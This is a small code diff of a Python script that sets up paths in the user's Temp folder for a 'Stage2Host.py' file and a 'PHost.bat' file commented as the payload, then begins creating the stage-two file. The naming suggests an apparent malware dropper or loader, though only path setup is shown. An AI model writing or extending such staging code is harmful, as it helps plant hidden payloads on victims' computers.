@@ -1,8 +1,8 @@
 import os.path
 import urllib.request
 
+path = ("/Users/" + str(os.getlogin()) + "/AppData/Local/Temp/Stage2Host.py")   # Path to Stage2Host File
 filename = ("/Users/" + str(os.getlogin()) + "/AppData/Local/Temp/PHost.bat") # Path to Payload
-
 
 # Creates Stage2Host
 if os.path.isfile(path) == False: 
